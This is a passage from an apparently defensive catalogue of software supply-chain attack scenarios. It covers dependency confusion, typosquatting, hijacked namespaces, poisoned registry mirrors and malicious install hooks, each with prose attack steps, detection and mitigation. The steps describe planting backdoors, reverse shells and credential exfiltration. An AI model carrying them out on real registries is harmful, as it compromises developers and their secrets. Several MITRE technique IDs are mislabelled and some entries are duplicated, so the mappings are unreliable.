- **Scenario**: A Python dev environment installs from both internal and public indexes. An attacker publishes a malicious version of an internal-only package to PyPI.
- **Attack Steps**: 1. Attacker finds a package used internally like @company/internal-utils through leaked code or requirements.txt.2. They create a malicious package with the same name (internal-utils) and publish it to the public PyPI registry.3. In poorly configured environments, pip resolves the external package instead of the internal one if the public index is prioritized or the internal one is unavailable.4. The malicious package executes code during setup.py or runtime (e.g., keylogger, backdoor).5. The organization unknowingly installs and uses the malicious version.
- **Detection**: Monitor pip logs, use hash pinning
- **Solution**: Configure pip to prefer internal registries; block unknown external mirrors.
- **Tags**: python, pip, internal registry, typosquatting

## Namespace Hijacking via Abandoned Library

- **Attack Type**: Malicious Libraries
- **Target**: JavaScript CI/CD Builds
- **Vulnerability**: Abandoned namespace reuse
- **MITRE**: T1195.002
- **Impact**: Backdoor deployment across multiple orgs
- **Tools**: npm, WHOIS, nslookup
- **Scenario**: A developer finds an unmaintained JavaScript library that was removed from npm but is still listed in thousands of projects.
- **Attack Steps**: 1. Attacker finds a package (e.g., old-utils) that was once widely used but is now unmaintained or deleted from npm.2. They register the package name on npm using a new account.3. They push a version that retains the old API surface but includes a hidden backdoor (e.g., fetch and execute from C2).4. As teams reinstall or CI/CD pipelines auto-resolve dependencies, the malicious version is pulled.5. Code executes silently during build or runtime due to trust in the name.
- **Detection**: Track reappearances of deprecated packages
- **Solution**: Lock dependencies using SHA hashing; monitor registry changes.
- **Tags**: npm, abandoned packages, registry abuse

## Confusion Between Scoped and Unscoped Libraries

- **Attack Type**: Dependency Confusion
- **Target**: Node.js Applications
- **Vulnerability**: Misconfiguration in package scoping
- **MITRE**: T1195.002
- **Impact**: Credential theft, internal log leakage
- **Tools**: npm, Yarn, VS Code
- **Scenario**: A scoped internal package (@corp/util-logger) is mistakenly referenced as an unscoped public package, leading to malicious code execution.
- **Attack Steps**: 1. Organization uses private scoped packages (e.g., @corp/util-logger) hosted in a private npm registry.2. Developer accidentally references the same name without scope (util-logger) in a public file.3. Attacker publishes a malicious unscoped package named util-logger to npm.4. The unscoped version gets pulled during CI due to misconfiguration or local install errors.5. Malicious package includes hidden keylogger in logger functions.6. It exfiltrates logs to an external server.
- **Detection**: Compare scoped/unscoped usage in audit tools
- **Solution**: Always use scoped imports for private libraries.
- **Tags**: npm, yarn, package scopes, internal pkg confusion

## Malicious Version in Private Registry Mirrors

- **Attack Type**: Malicious Libraries
- **Target**: Internal DevOps
- **Vulnerability**: Mirror tampering by insider
- **MITRE**: T1195.002
- **Impact**: Secrets leak, internal system access
- **Tools**: Nexus, Artifactory, curl
- **Scenario**: An attacker compromises a self-hosted registry mirror and inserts a trojaned version of a common package.
- **Attack Steps**: 1. Organization hosts a private mirror of npm or PyPI (e.g., using Sonatype Nexus or JFrog Artifactory).2. Attacker with internal access uploads a malicious package version to the mirror.3. Teams using the mirror unknowingly pull the trojaned version (e.g., lodash 4.17.21 with altered logic).4. During app builds or tests, the malicious code activates.5. Payload might send environment variables or tokens to a remote server.
- **Detection**: Monitor checksum mismatches between mirror and origin
- **Solution**: Enforce read-only permissions to mirrors, and enable content integrity checks.
- **Tags**: npm, nexus, mirror, insider threat

## Dev Toolchain Poisoning via package-lock.json

- **Attack Type**: Dependency Confusion
- **Target**: JavaScript CI Envs
- **Vulnerability**: Manual lockfile injection
- **MITRE**: T1195.002
- **Impact**: Long-term CI poisoning, token exfiltration
- **Tools**: npm, jq, VS Code
- **Scenario**: A malicious package mimics a transitive dependency and is manually inserted into package-lock.json, poisoning downstream installations.
- **Attack Steps**: 1. Attacker gets access to a project repo and modifies package-lock.json to insert a fake package or version (e.g., axios@999.0.0).2. They publish axios@999.0.0 on npm containing malicious install scripts.3. Devs trusting the lock file run npm ci, which installs all locked packages as-is without verifying intent.4. The malicious postinstall hook exfiltrates tokens or launches a shell.5. The poisoned package becomes persistent across environments using the same lock file.
- **Detection**: Check git diffs on lock files; verify hashes
- **Solution**: Use lockfile-lint tools and enable package integrity validation.
- **Tags**: npm, lockfile, ci, postinstall, persistent attack

## Python Wheel Upload with Obfuscated Payload

- **Attack Type**: Malicious Libraries
- **Target**: Python Build Pipelines
- **Vulnerability**: Obfuscated code in wheel
- **MITRE**: T1059.006 (Command & Scripting)
- **Impact**: Backdoor access to dev machines
- **Tools**: PyPI, pip, base64, wheel
- **Scenario**: A malicious actor uploads a wheel file (.whl) to PyPI that looks like a normal package but contains obfuscated reverse shell code.
- **Attack Steps**: 1. Attacker crafts a Python library (e.g., secure-crypto) with attractive descriptions and legit-looking documentation.2. They hide a reverse shell in one of the modules using base64 encoding and dynamic import.3. Package is uploaded to PyPI as a wheel (.whl), which many CI pipelines auto-resolve.4. During installation or import, obfuscated shellcode connects to a remote listener.5. Developers using pip install secure-crypto are unaware of the backdoor.
- **Detection**: Use wheel unpacking tools to inspect content
- **Solution**: Only install from vetted authors; use sandboxed builds.
- **Tags**: pip, wheel, python, obfuscation, remote shell

## TypeScript Definition File (.d.ts) Trojan

- **Attack Type**: Malicious Libraries
- **Target**: TypeScript Projects
- **Vulnerability**: Executable logic in type files
- **MITRE**: T1195.002
- **Impact**: Token theft or code injection during compile
- **Tools**: npm, TypeScript, tsc
- **Scenario**: A TypeScript package includes a .d.ts file with logic executed via custom build tools, silently triggering malicious code.
- **Attack Steps**: 1. Attacker creates a TypeScript utility package (e.g., fast-strings) that ships with a suspicious .d.ts file.2. Instead of only declaring types, the .d.ts includes executable code or code that’s interpreted by custom loaders.3. Some dev environments or compilers auto-process .d.ts files during builds.4. The malicious payload triggers during type-check or documentation generation.5. It steals tokens or injects rogue functions silently.
- **Detection**: Manually inspect .d.ts files; use build hardening
- **Solution**: Avoid 3rd-party type packages unless from trusted orgs.
- **Tags**: typescript, declaration, tsconfig, compile abuse

## Typosquatted Analytics SDK

- **Attack Type**: Dependency Confusion
- **Target**: Web Frontend Apps
- **Vulnerability**: Typosquatting, data redirection
- **MITRE**: T1557.001 (Man-in-the-Middle)
- **Impact**: Privacy violations, session token leakage
- **Tools**: npm, web browser dev tools
- **Scenario**: A typosquatted package mimics a popular analytics SDK (e.g., analytics.js) and sends data to attacker infrastructure.
- **Attack Steps**: 1. Attacker creates analytcs.js (missing “i”) and publishes it to npm.2. They copy the original package interface but alter the endpoint URLs and add tracking scripts.3. Web developers mistakenly install the wrong package due to typo in package.json.4. On production deployment, visitor analytics are sent to the attacker's server.5. Attacker gains insights into user behavior, device info, even session IDs.
- **Detection**: Validate package names before commit
- **Solution**: Use SCA tools to flag suspicious, similar-name packages.
- **Tags**: npm, frontend, typo, sdk, analytics

## Git Dependency Submodule Confusion

- **Attack Type**: Dependency Confusion
- **Target**: Git CI/CD Pipelines
- **Vulnerability**: Internal Git override or confusion
- **MITRE**: T1195.002
- **Impact**: Data theft or logic manipulation
- **Tools**: Git, GitHub, Submodules
- **Scenario**: A Git submodule path points to a public repo, but an attacker registers the same name in an internal mirror, which gets resolved wrongly.
- **Attack Steps**: 1. Dev project uses a Git submodule (e.g., libs/data-utils) pointing to GitHub.2. Attacker gains access to internal Git mirror and registers a project with the same name.3. Misconfigured internal CI/CD prefers internal over external Git.4. During pipeline clone, attacker’s version is pulled instead.5. The malicious submodule includes altered scripts that leak data or poison builds.6. The attacker gains code execution or data theft during internal deploys.
- **Detection**: Validate submodule SHA and origin URLs
- **Solution**: Use explicit Git remote URLs and pinned commits.
- **Tags**: git, submodule, internal, misconfigured mirror

## Git Dependency Submodule Confusion

- **Attack Type**: Dependency Confusion
- **Target**: Git CI/CD Pipelines
- **Vulnerability**: Internal Git override or confusion
- **MITRE**: T1195.002
- **Impact**: Data theft or logic manipulation
- **Tools**: Git, GitHub, Submodules
- **Scenario**: A Git submodule path points to a public repo, but an attacker registers the same name in an internal mirror, which gets resolved wrongly.
- **Attack Steps**: 1. Dev project uses a Git submodule (e.g., libs/data-utils) pointing to GitHub.2. Attacker gains access to internal Git mirror and registers a project with the same name.3. Misconfigured internal CI/CD prefers internal over external Git.4. During pipeline clone, attacker’s version is pulled instead.5. The malicious submodule includes altered scripts that leak data or poison builds.6. The attacker gains code execution or data theft during internal deploys.
- **Detection**: Validate submodule SHA and origin URLs
- **Solution**: Use explicit Git remote URLs and pinned commits.
- **Tags**: git, submodule, internal, misconfigured mirror

## Dependency Confusion via DevOps Internal Registry Leak

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipeline
- **Vulnerability**: Misconfigured Package Registry
- **MITRE**: T1195.002 (Supply Chain Compromise)
- **Impact**: Pipeline compromise, secrets theft, lateral movement
- **Tools**: GitHub Actions, npm, Burp Suite
- **Scenario**: An attacker exploits a misconfigured DevOps pipeline where private registry names are leaked in CI logs, enabling public package name takeover.
- **Attack Steps**: 1. Attacker scans public CI/CD logs from GitHub Actions for internal registry references like @corp-lib/internal-api.2. They notice a pattern of internal library names not publicly claimed on npm.3. The attacker creates an npm package named @corp-lib/internal-api, adds malicious post-install scripts.4. They upload it to npm before the real team publishes it.5. On next CI run, due to registry misconfiguration or fallback, the build system pulls from npm instead of private registry.6. The malicious script executes in the CI container, stealing secrets or injecting code.
- **Detection**: Registry audit logs, artifact hash mismatch
- **Solution**: Enforce scoped registry use and lockfile verification
- **Tags**: devops, ci/cd, registry, npm, misconfiguration

## PyPI Typosquatting on Popular ML Library

- **Attack Type**: Malicious Libraries
- **Target**: Developer Workstation
- **Vulnerability**: Typosquatting on package index
- **MITRE**: T1556.001 (Input Capture)
- **Impact**: Credential exfiltration, remote access via backdoor
- **Tools**: PyPI, pip, WhoisXML API
- **Scenario**: Attacker typosquats tensorflow by uploading tensoflow to PyPI with malicious post-install scripts.
- **Attack Steps**: 1. Attacker checks for popular Python ML libraries with high downloads (e.g., tensorflow).2. They find a typo variant like tensoflow is available.3. A PyPI package named tensoflow is created that mimics legitimate metadata.4. A malicious payload is hidden inside a setup.py post-install hook.5. The attacker waits for careless pip installs, especially from Jupyter or tutorials (pip install tensoflow).6. When installed, the malicious script runs with user privileges, exfiltrating credentials or setting up backdoors.
- **Detection**: Monitoring of unusual package names in use
- **Solution**: Monitor DNS typosquat domains and block known typosquats
- **Tags**: pypi, typosquat, python, ml, postinstall

## Compromised Maintainer Injects Backdoor in Minor Patch

- **Attack Type**: Malicious Libraries
- **Target**: Application Servers
- **Vulnerability**: Credential Compromise
- **MITRE**: T1606.001 (Drive-by Compromise)
- **Impact**: Wide-scale library-level compromise
- **Tools**: npm, GitHub, Git Hooks
- **Scenario**: A maintainer's credentials are phished, and a patch release of a popular package silently includes a backdoor in a helper function.
- **Attack Steps**: 1. Attacker targets a package maintainer via phishing and obtains GitHub/npm credentials.2. They push a new minor version (e.g., 1.2.4) of a library like http-req-lib.3. A new helper function is added that conditionally sends HTTP requests to an external domain under certain headers.4. Since it appears harmless and the update is minor, users auto-update via npm install.5. Thousands of applications unknowingly include the malicious function in their apps.6. The attacker uses the outbound beacon to track installs or trigger payloads.
- **Detection**: Diffing of package versions, unexpected DNS calls
- **Solution**: Use npm audit, enable 2FA on maintainer accounts
- **Tags**: github, npm, maintainers, phishing, code diff

## Dependency Confusion via .NET NuGet Internal Namespace Hijack

- **Attack Type**: Dependency Confusion
- **Target**: .NET Applications
- **Vulnerability**: Public NuGet Feed Misconfiguration
- **MITRE**: T1195.002
- **Impact**: Remote execution on internal .NET projects
- **Tools**: NuGet CLI, ILSpy, DNSDumpster
- **Scenario**: A NuGet package with internal corporate naming conventions is registered on the public feed, allowing attacker injection during build.
- **Attack Steps**: 1. Attacker observes an internal corporate namespace from leaked .csproj files, e.g., Contoso.Internal.Logging.2. They attempt to register Contoso.Internal.Logging on NuGet.org.3. The package is accepted because it wasn’t published before.4. The attacker includes DLLs with malicious constructors executed upon inclusion.5. Developers accidentally pull the public package due to a misconfigured NuGet.config file prioritizing public feeds.6. When the build runs, the malicious logic is executed during class instantiation or unit testing.
- **Detection**: Monitor outbound NuGet requests, DNS calls
- **Solution**: Restrict allowed package sources in NuGet.config
- **Tags**: dotnet, nuget, dll, dependency-confusion

## Rust Crate with Embedded Binary Payload

- **Attack Type**: Malicious Libraries
- **Target**: Rust Projects
- **Vulnerability**: Malicious Precompiled Payload
- **MITRE**: T1059.004 (Command and Scripting Interpreter)
- **Impact**: Shell manipulation, C2 connection
- **Tools**: Cargo, VirusTotal, RustSec
- **Scenario**: A Rust crate includes a compiled malicious binary (instead of pure Rust code) that executes upon install or import.
- **Attack Steps**: 1. Attacker uploads a new crate named fast-hashing-util with great documentation and fake stars.2. Inside the crate, a small binary ELF payload is included and hidden in the build.rs script.3. Upon compilation, build.rs executes and runs the binary with elevated permissions if possible.4. The binary connects to a C2 server or modifies local shell configurations.5. Since Rust packages are often blindly trusted, the binary bypasses initial inspection.6. User notices unusual behavior only after deeper runtime inspection.
- **Detection**: Cargo audit, runtime behavior analysis
- **Solution**: Use reproducible builds, static analysis before install
- **Tags**: rust, crates.io, binary payload, build.rs

## Go Module Replacing Legit Library via Vanity Import Path Trick

- **Attack Type**: Dependency Confusion
- **Target**: Go Applications
- **Vulnerability**: Vanity URL Exploit
- **MITRE**: T1557.003
- **Impact**: Environment variable theft, persistent logic injection
- **Tools**: Go Modules, GitHub, goimports
- **Scenario**: An attacker abuses a vanity import path redirect in a Go module to point to a malicious clone of a common library.
- **Attack Steps**: 1. Attacker sets up go-mylib.example.com and configures it to redirect go get to a GitHub repo they control.2. They create a repo mimicking golang.org/x/mylib but with added malicious init function.3. A developer mistakenly uses the vanity import path instead of canonical one.4. go get fetches the malicious repo via redirect.5. The malicious code runs during init, logging environment variables or injecting handlers.6. Exploit goes unnoticed as code appears identical during review.
- **Detection**: Manual review of go.sum and import sources
- **Solution**: Use replace directive for internal modules
- **Tags**: go, vanity import, redirect, init injection

## Python Wheel with Obfuscated Code Bypassing Linter

- **Attack Type**: Malicious Libraries
- **Target**: Python Environments
- **Vulnerability**: Obfuscated Malicious Payload
- **MITRE**: T1027.002
- **Impact**: Reverse shell, command execution
- **Tools**: PyPI, twine, black, pip
- **Scenario**: A Python wheel package includes a payload hidden inside an obfuscated base64 eval blob, bypassing code quality tools.
- **Attack Steps**: 1. Attacker creates a library named data-utils-fast with seemingly helpful string utilities.2. The core logic file includes a massive base64-encoded blob in a single line.3. This blob is decoded and executed dynamically using exec().4. Linters and code review tools skip inspection due to obfuscation.5. When installed, the code opens a reverse shell if certain environment variables are present (e.g., CI or prod).6. Attacker gains access to sensitive environments undetected.
- **Detection**: Runtime behavior anomaly detection
- **Solution**: Disallow use of exec() and audit installation logs
- **Tags**: python, wheel, obfuscation, base64, evasion

## CI/CD Secrets Exfil via Malicious Java Build Plugin

- **Attack Type**: Malicious Libraries
- **Target**: CI/CD Pipelines
- **Vulnerability**: Plugin Name Spoofing
- **MITRE**: T1557.001
- **Impact**: CI/CD secrets theft, cloud account compromise
- **Tools**: Maven, GitHub, Wireshark
- **Scenario**: A Java Maven plugin is poisoned with code that extracts environment secrets during build time and sends to attacker.
- **Attack Steps**: 1. Attacker forks a popular Maven plugin (e.g., clean-plugin) and adds a new lifecycle step that reads environment variables.2. The plugin silently encodes these values and exfiltrates via HTTP POST.3. The plugin is published under a very similar group ID to the original (org.apache.cleanplugin instead of org.apache.maven.plugins).4. Developers unknowingly use this due to autocomplete in IDEs.5. During build, secrets like AWS keys and database credentials are exfiltrated.6. The attacker collects secrets at scale from many CI/CD environments.
- **Detection**: Monitor HTTP outbound traffic from build machines
- **Solution**: Whitelist plugin sources, verify Maven group IDs
- **Tags**: java, maven, plugin, ci, exfiltration

## Composer PHP Package Dependency Confusion

- **Attack Type**: Dependency Confusion
- **Target**: PHP Applications
- **Vulnerability**: Namespace Collision in Composer
- **MITRE**: T1195.002
- **Impact**: Compromise of internal web applications
- **Tools**: Composer, Packagist, Burp Suite
- **Scenario**: An attacker registers a PHP package on Packagist using a name collision with an internal enterprise Composer dependency.
- **Attack Steps**: 1. Attacker scans internal PHP repos or exposed composer.lock files and identifies internal package like acme/common-lib.2. They register acme/common-lib on Packagist.3. They add code in autoloaded functions that sends system info and credentials to their server.4. During build or deploy, developers unknowingly pull the public package due to a missing repositories entry.5. Attacker gains foothold via the malicious package in production.6. Maintainers remain unaware unless a full audit or diff is conducted.
- **Detection**: Composer audit, outbound monitoring
- **Solution**: Always use "prefer-source" and lock internal versions
- **Tags**: php, composer, dependency-confusion, acme

## Fake Dependency in JavaScript Obfuscates Backdoor Using Polyglot

- **Attack Type**: Malicious Libraries
- **Target**: JavaScript Frontend
- **Vulnerability**: Polyglot Code Obfuscation
- **MITRE**: T1027
- **Impact**: Session theft from users on the web
- **Tools**: npm, jsfuck, CSS parser
- **Scenario**: A malicious JS library uses polyglot payloads to obfuscate a backdoor under the guise of minified CSS/JS mixed content.
- **Attack Steps**: 1. Attacker publishes a JS library called web-theme-enhancer, advertising UI components.2. The main.js file contains what looks like heavily minified CSS+JS but includes a polyglot payload.3. The code uses overlapping CSS/JS syntax to hide an XHR request that steals cookies.4. Browsers render CSS, while Node parses JS logic — both serve the attacker.5. Developers include the package in frontend builds.6. Attacker monitors stolen tokens from real users when the web app loads.
- **Detection**: Monitor CSP violations, JS anomalies
- **Solution**: Disallow unknown packages in frontends, enable SRI hashing
- **Tags**: javascript, obfuscation, polyglot, web

## Fake Dependency in JavaScript Obfuscates Backdoor Using Polyglot

- **Attack Type**: Malicious Libraries
- **Target**: JavaScript Frontend
- **Vulnerability**: Polyglot Code Obfuscation
- **MITRE**: T1027
- **Impact**: Session theft from users on the web
- **Tools**: npm, jsfuck, CSS parser
- **Scenario**: A malicious JS library uses polyglot payloads to obfuscate a backdoor under the guise of minified CSS/JS mixed content.
- **Attack Steps**: 1. Attacker publishes a JS library called web-theme-enhancer, advertising UI components.2. The main.js file contains what looks like heavily minified CSS+JS but includes a polyglot payload.3. The code uses overlapping CSS/JS syntax to hide an XHR request that steals cookies.4. Browsers render CSS, while Node parses JS logic — both serve the attacker.5. Developers include the package in frontend builds.6. Attacker monitors stolen tokens from real users when the web app loads.
- **Detection**: Monitor CSP violations, JS anomalies
- **Solution**: Disallow unknown packages in frontends, enable SRI hashing
- **Tags**: javascript, obfuscation, polyglot, web

## Typosquatted Package with Data Exfiltration

- **Attack Type**: Dependency Confusion
- **Target**: Developers, CI pipelines
- **Vulnerability**: Typosquatting on public package registries
- **MITRE**: T1195.002
- **Impact**: Leakage of secrets, credentials, and tokens
- **Tools**: PyPI, npm, MITMProxy
- **Scenario**: A malicious actor uploads a fake package with a name similar to a popular one (expresss) that silently exfiltrates data upon install.
- **Attack Steps**: 1. Attacker identifies a popular package (express) and uploads a typosquatted version (expresss) to npm.2. The fake package contains a postinstall script that reads local .env and system info.3. It silently sends this data to an attacker-controlled server using HTTPS.4. Developer accidentally installs expresss thinking it's legit.5. When the package is installed, it triggers the postinstall hook and exfiltrates data without being detected.6. Attacker receives system credentials or tokens from infected developers.
- **Detection**: Monitor unusual outbound connections post install
- **Solution**: Use --ignore-scripts, validate package names carefully
- **Tags**: typosquatting, npm, postinstall, exfiltration

## Dependency Confusion via Private/Scoped Package Hijack

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines
- **Vulnerability**: Registry misconfiguration, namespace conflict
- **MITRE**: T1199
- **Impact**: Supply chain poisoning, credential theft
- **Tools**: npm, npmrc config, Whois
- **Scenario**: Public package with the same name as a private internal dependency is uploaded to npm, taking precedence due to misconfigured registry resolution.
- **Attack Steps**: 1. Attacker identifies internal dependency names via leaked package.json or repo info (@company/core-utils).2. They upload a public package with same name to npm.3. Target organization’s CI/CD does not explicitly set registry in .npmrc.4. The build system downloads the attacker’s public package instead of the internal one.5. Attacker’s malicious version includes scripts that steal environment variables.6. Sensitive secrets, tokens, or cloud credentials get exfiltrated.
- **Detection**: Detect untrusted packages in builds
- **Solution**: Use scoped registry settings in .npmrc, block external upload of internal names
- **Tags**: registry poisoning, private vs public scope, CI/CD attack

## Event-Driven Execution in Malicious Python Wheel

- **Attack Type**: Malicious Libraries
- **Target**: Python devs & scripts
- **Vulnerability**: Code execution on import
- **MITRE**: T1059.006
- **Impact**: Covert execution, data leak
- **Tools**: PyPI, pip, twine, Virtualenv
- **Scenario**: A compromised .whl package uploaded to PyPI executes code during import using __init__.py event hooks.
- **Attack Steps**: 1. Attacker creates a fake Python library with a familiar name like dateutils.2. The library’s __init__.py includes hidden code that executes on import.3. This code runs even if the developer only checks the version or lists dependencies.4. It collects system info and uploads it to attacker’s server.5. Developer installs and imports it unknowingly.6. Data exfiltration occurs without requiring any function call.7. This is effective especially in Jupyter/Colab notebooks where importing libraries is frequent.
- **Detection**: Monitor imported packages dynamically
- **Solution**: Inspect __init__.py in third-party libraries
- **Tags**: python wheels, autoexec, import abuse, pypi

## Hijacking LeftPad with Malicious Redirect

- **Attack Type**: Dependency Confusion
- **Target**: Legacy projects
- **Vulnerability**: Dependency trust after abandonment
- **MITRE**: T1555
- **Impact**: Reconnaissance, future attack staging
- **Tools**: npm, Network Monitor, Burp Suite
- **Scenario**: Attacker reuploads left-pad with modified logic that includes a web tracker or beacon that sends project and system info.
- **Attack Steps**: 1. Attacker waits for abandonment or deletion of a package like left-pad.2. They register and upload a modified version with same name.3. They insert beacon logic in the main module that sends info like project name, time, and username.4. Many legacy projects auto-install it when rebuilding.5. The attacker receives project-specific telemetry and potentially identifies high-value targets.6. This may be used for later targeted attacks or profiling.
- **Detection**: Detect beacon URLs in traffic logs
- **Solution**: Audit installed packages periodically
- **Tags**: abandoned modules, telemetry abuse, beacon injection

## Fake Package with Obfuscated Crypto Miner

- **Attack Type**: Malicious Libraries
- **Target**: Developer systems
- **Vulnerability**: Obfuscated malicious code
- **MITRE**: T1496
- **Impact**: Resource hijacking, degraded performance
- **Tools**: npm, Node.js, Wireshark
- **Scenario**: A fake npm package pretends to be a useful utility but includes an obfuscated crypto miner triggered during idle system time.
- **Attack Steps**: 1. Attacker uploads a fake package like async-calc.2. It includes obfuscated code using eval() and string splitting.3. Upon install, it sets up a background cron job or process that initiates mining.4. It only activates when CPU usage is low, to avoid detection.5. Developer may not notice unless system performance is monitored closely.6. Company systems get used for illicit crypto mining.
- **Detection**: Monitor CPU spikes and hidden processes
- **Solution**: Ban obfuscated code in internal builds
- **Tags**: crypto miner, obfuscation, async abuse, npm

## CI/CD Dependency Pull from Compromised Registry Mirror

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD systems
- **Vulnerability**: Mirror trust, unsigned packages
- **MITRE**: T1199
- **Impact**: Persistent malware in build pipelines
- **Tools**: Custom Registry, Jenkins, curl
- **Scenario**: CI/CD pipelines are configured to pull from a faster registry mirror, but attacker compromises the mirror server to inject malware.
- **Attack Steps**: 1. Company uses a mirror registry to improve build speed (e.g., internal Artifactory/Nexus proxy).2. Attacker compromises the mirror (via RCE or insider threat).3. They replace certain known packages with trojanized versions.4. CI/CD pipelines continue to pull the packages assuming trust.5. Malware is introduced and runs within the pipeline, stealing secrets.6. Detection is difficult unless the mirrored package is checksum-verified.
- **Detection**: Compare checksums with source registry
- **Solution**: Verify signatures and checksums from upstream sources
- **Tags**: mirror poisoning, CI/CD trust abuse, registry compromise

## Malicious Postinstall in Docker Base Image

- **Attack Type**: Malicious Libraries
- **Target**: Docker-based deployments
- **Vulnerability**: Postinstall misuse in containers
- **MITRE**: T1543
- **Impact**: Unauthorized remote access via container chains
- **Tools**: Docker, DockerHub, bash
- **Scenario**: A base Docker image used by multiple teams is updated with a malicious layer containing a package with a hidden postinstall payload.
- **Attack Steps**: 1. Attacker forks an open-source base Docker image.2. Adds a package like curl-utils, which on install runs postinstall.sh.3. The script adds a backdoor user or SSH key, or exfiltrates .bash_history.4. The modified image is pushed to DockerHub under a similar name (node-alpine-lite).5. A developer unknowingly uses the malicious image as base in their Dockerfile.6. The payload executes at image build or container runtime.7. The attacker gains access to future containers built from it.
- **Detection**: Monitor image digests and layer diffs
- **Solution**: Use signed base images, avoid unverified forks
- **Tags**: docker base abuse, postinstall, SSH backdoor

## Backdoored Go Module with Malicious init() Logic

- **Attack Type**: Malicious Libraries
- **Target**: Go-based builds
- **Vulnerability**: Auto-exec in Go init()
- **MITRE**: T1203
- **Impact**: Remote shell, lateral movement
- **Tools**: Go modules, Go Proxy, Netcat
- **Scenario**: A Go module is backdoored by inserting logic in the init() function which runs automatically on import, creating covert outbound tunnels.
- **Attack Steps**: 1. Attacker uploads or contributes to a Go module (github.com/legittools/parser) with backdoored init().2. When the module is imported, init() creates a reverse shell using raw TCP sockets.3. It listens for triggers such as a special domain lookup or env variable.4. Corporate Go apps using this module execute the logic during import without any suspicious calls.5. The attacker now has a shell on dev or test systems.6. Detection is hard due to Go's static binaries.
- **Detection**: Monitor outbound traffic in dev systems
- **Solution**: Review init() behavior during code audit
- **Tags**: go modules, reverse shell, init abuse

## Time Bomb Logic in Delayed Malicious Package

- **Attack Type**: Malicious Libraries
- **Target**: Developer workstations
- **Vulnerability**: Trust gained over time, timed payloads
- **MITRE**: T1499
- **Impact**: Widespread delayed compromise
- **Tools**: npm, PyPI, Temporal Debugger
- **Scenario**: A package stays clean for a month to gain trust, then updates include a logic bomb that triggers after a delay or date check.
- **Attack Steps**: 1. Attacker publishes a helpful package (pdf-enhancer) and promotes it for 30 days with no malicious behavior.2. After enough stars and downloads, they release a minor version update (v1.2.3).3. This version includes a script that runs only if current date > certain day.4. The script deletes .git directories or exfiltrates tokens.5. Victims install this updated version assuming trust.6. Time bomb logic activates silently post-deployment.
- **Detection**: Version comparison, static code time checks
- **Solution**: Avoid auto-updating packages, lock known-good versions
- **Tags**: logic bomb, delayed attack, timed execution

## Java Maven Central Shadow Upload

- **Attack Type**: Dependency Confusion
- **Target**: Java build pipelines
- **Vulnerability**: Maven trust abuse, groupId spoofing
- **MITRE**: T1554
- **Impact**: JAR-based compromise, persistent payloads
- **Tools**: Maven, mvn, jar-signing tools
- **Scenario**: A malicious JAR is uploaded to Maven Central using similar groupId/artifactId to a popular library and abused during mvn install.
- **Attack Steps**: 1. Attacker registers group ID com.google.guavaa and uploads a JAR named guava-core.2. Target project mistakenly references the malicious guava-core JAR in pom.xml.3. During build, Maven downloads and includes the malicious JAR.4. The JAR executes malicious code at class static load or during build phase.5. It could modify artifacts or drop files in the build machine.6. Since many builds are automated, human review is rare, and the malicious JAR spreads across projects.
- **Detection**: Analyze Maven dependency tree and artifact source
- **Solution**: Use trusted repos, lock exact artifact versions
- **Tags**: java, maven, jar malware, shadow upload

## Java Maven Central Shadow Upload

- **Attack Type**: Dependency Confusion
- **Target**: Java build pipelines
- **Vulnerability**: Maven trust abuse, groupId spoofing
- **MITRE**: T1554
- **Impact**: JAR-based compromise, persistent payloads
- **Tools**: Maven, mvn, jar-signing tools
- **Scenario**: A malicious JAR is uploaded to Maven Central using similar groupId/artifactId to a popular library and abused during mvn install.
- **Attack Steps**: 1. Attacker registers group ID com.google.guavaa and uploads a JAR named guava-core.2. Target project mistakenly references the malicious guava-core JAR in pom.xml.3. During build, Maven downloads and includes the malicious JAR.4. The JAR executes malicious code at class static load or during build phase.5. It could modify artifacts or drop files in the build machine.6. Since many builds are automated, human review is rare, and the malicious JAR spreads across projects.
- **Detection**: Analyze Maven dependency tree and artifact source
- **Solution**: Use trusted repos, lock exact artifact versions
- **Tags**: java, maven, jar malware, shadow upload

## Typosquatted Go Module for Internal Microservice

- **Attack Type**: Dependency Confusion
- **Target**: Internal Dev Systems
- **Vulnerability**: Absence of namespace validation in Go modules
- **MITRE**: T1195.002 (Compromise Software Dependency)
- **Impact**: Environment variable exfiltration
- **Tools**: Go proxy, Go CLI, Whois
- **Scenario**: A typosquatted Go module is published to impersonate a private microservice module used in internal Go projects.
- **Attack Steps**: 1. Attacker identifies an internal Go import path like company.com/internal/tools/logger from a leaked .go file.2. They register company-tools-logger on public module repositories like pkg.go.dev.3. The attacker uploads a malicious Go module that matches the expected package name and structure.4. Developer runs go get which mistakenly fetches from the public repo.5. Malicious logic is executed at build or runtime (e.g., calling out to remote C2 or leaking ENV vars).6. The attacker gains access to sensitive build-time secrets or environment variables.
- **Detection**: Monitor unexpected external module fetches
- **Solution**: Use private module mirrors; enforce checksumdb
- **Tags**: go-modules, typosquatting, internal-leak

## Preinstall Script Abuse in .deb Package

- **Attack Type**: Malicious Libraries
- **Target**: Linux Build Servers
- **Vulnerability**: Trusting unverified packages
- **MITRE**: T1608.004 (Upload Malicious Component)
- **Impact**: Credential theft and long-term persistence
- **Tools**: dpkg, apt-mirror
- **Scenario**: An attacker uploads a malicious .deb package to a lesser-known APT repository containing a preinstall script that runs arbitrary commands during install.
- **Attack Steps**: 1. Attacker creates a .deb package named libssl1.1-fix to appear like a security patch.2. Inside the control file, they add a preinst script that runs a shell script.3. The .deb is uploaded to a third-party repo or shared via email.4. The developer, thinking it’s a fix, installs using dpkg -i.5. The preinstall script runs before unpacking and exfiltrates SSH keys.6. Malicious logic completes before user realizes compromise.7. The attacker maintains persistence via cronjob dropped in /etc/cron.d/.
- **Detection**: Monitor .deb scripts and install events
- **Solution**: Only install from signed, verified sources
- **Tags**: debian, apt, persistence, supply-chain

## GitLab Package Registry Poisoning via Unauthenticated Uploads

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipelines
- **Vulnerability**: Misconfigured GitLab Package Registry
- **MITRE**: T1195.002
- **Impact**: Lateral movement within internal CI ecosystem
- **Tools**: GitLab CLI, Burp Suite
- **Scenario**: A public GitLab instance has package registry enabled without authentication checks, allowing an attacker to upload spoofed packages.
